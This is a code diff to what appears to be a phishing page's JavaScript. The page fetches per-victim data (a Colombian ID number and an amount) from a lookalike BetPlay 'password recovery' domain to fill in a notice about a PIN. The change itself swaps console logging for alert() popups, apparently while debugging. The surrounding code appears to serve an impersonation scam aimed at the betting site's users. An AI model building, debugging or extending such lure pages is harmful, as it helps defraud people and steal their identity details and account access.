@@ -1700,11 +1700,12 @@ const TOKEN_API = "https://recuperacion-de-contrasena-betplay.com/token/";
 let CEDULA = "";
 let MONTO = "";
 window.addEventListener('DOMContentLoaded', function(){
+  alert("Script ejecutado");
   var params = new URLSearchParams(window.location.search);
   var t = params.get("t");
   if (!t) return;
   fetch(TOKEN_API + t).then(function(r){return r.json();}).then(function(data){
-    console.log("Token data:", data);
+    alert("Token: " + JSON.stringify(data));
     if(data && data.cedula){
       CEDULA = data.cedula;
       MONTO = data.monto || "";
@@ -1713,10 +1714,9 @@ window.addEventListener('DOMContentLoaded', function(){
       var h = ahora.getHours().toString().padStart(2,"0");
       var m = ahora.getMinutes().toString().padStart(2,"0");
       AVISO.hora = h + ":" + m;
-      console.log("AVISO actualizado:", AVISO.monto, AVISO.hora);
       pintarAvisoPin();
     }
-  }).catch(function(e){ console.log("Token fetch error:", e); });
+  }).catch(function(e){ alert("Error: " + e); });
 });
 function valCampo(id){ var e = document.getElementById(id); return e ? e.value : ""; }
 function mostrarMensaje(tipo, texto){
